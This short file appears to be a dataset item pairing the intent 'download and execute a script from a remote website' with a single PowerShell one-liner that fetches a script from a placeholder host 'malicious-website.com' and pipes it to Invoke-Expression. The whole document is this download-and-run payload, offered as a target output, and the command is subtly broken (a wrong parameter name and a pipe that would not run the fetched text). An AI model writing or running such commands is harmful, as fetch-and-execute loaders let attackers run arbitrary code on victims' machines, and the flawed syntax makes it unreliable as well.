# Natural language intent:
# Download and execute a script from a remote website using PowerShell

Invoke-Expression -Command "Invoke-WebRequest -Url 'http://malicious-website.com/malicious-script.ps1' | Invoke-Expression"
